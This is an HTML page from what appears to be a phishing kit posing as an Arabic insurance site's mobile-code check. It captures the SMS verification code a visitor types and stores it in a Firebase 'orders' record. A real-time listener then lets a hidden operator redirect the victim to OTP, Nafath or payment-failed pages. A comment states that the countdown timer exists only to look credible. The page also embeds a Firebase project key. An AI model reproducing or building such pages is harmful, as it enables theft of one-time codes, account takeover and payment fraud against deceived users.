<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>تأكيد رمز الجوال | Mobile Code</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/site-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { padding: 40px 25px; border-radius: var(--tree-radius-lg); width: 90%; max-width: 400px; text-align: center; }
        .logo { width: 100px; margin-bottom: 20px; object-fit: contain; }
        .timer { font-weight: bold; margin: 15px 0; font-size: 14px; }
        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 12px; font-size: 24px; text-align: center; letter-spacing: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 18px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body class="tree-site mobil-code-page">

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="card">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
        <img src="images/logo.png" class="logo" alt="Tree" onerror="this.src='https://placehold.co/100x40/198754/ffffff?text=TREE'" style="margin-bottom:0;">
        <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()" style="font-size:0.75rem;padding:3px 10px;">EN</button>
    </div>
    <h3 data-i18n="mcode.title">رمز تأكيد الجوال</h3>
    <p style="font-size: 14px; color: var(--tree-text-muted);" data-i18n="mcode.msg">أدخل الرمز المكون من 4 أرقام المرسل إلى جوالك لإتمام التحقق</p>
    
    <input type="number" id="smsCode" placeholder="— — — —" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
    
    <div class="timer"><span data-i18n="mcode.resend">سيتم إعادة إرسال الرمز خلال</span> <span id="time">01:59</span></div>

    <button onclick="verifyAndNext()" data-i18n="mcode.confirm">تأكيـد الرمز</button>
</div>

<script>
    // إعدادات Firebase الخاصة بك
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    // وظيفة الإرسال والانتقال لصفحة الاتصال
    async function verifyAndNext() {
        const code = document.getElementById('smsCode').value;
        if(code.length < 4) { alert(t('mcode.err_short')); return; }

        await db.collection("orders").doc(userId).update({
            mobile_sms_code: code,
            status: "تم تأكيد رمز الجوال - ينتقل للاتصال"
        });

        // الانتقال التلقائي لصفحة الاتصال الموجودة عندك
        window.location.href = "call_verification.html";
    }

    // عداد الوقت التنازلي للجمالية والمصداقية
    let duration = 119;
    const display = document.querySelector('#time');
    setInterval(() => {
        let minutes = parseInt(duration / 60, 10);
        let seconds = parseInt(duration % 60, 10);
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        display.textContent = minutes + ":" + seconds;
        if (--duration < 0) duration = 119;
    }, 1000);
    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
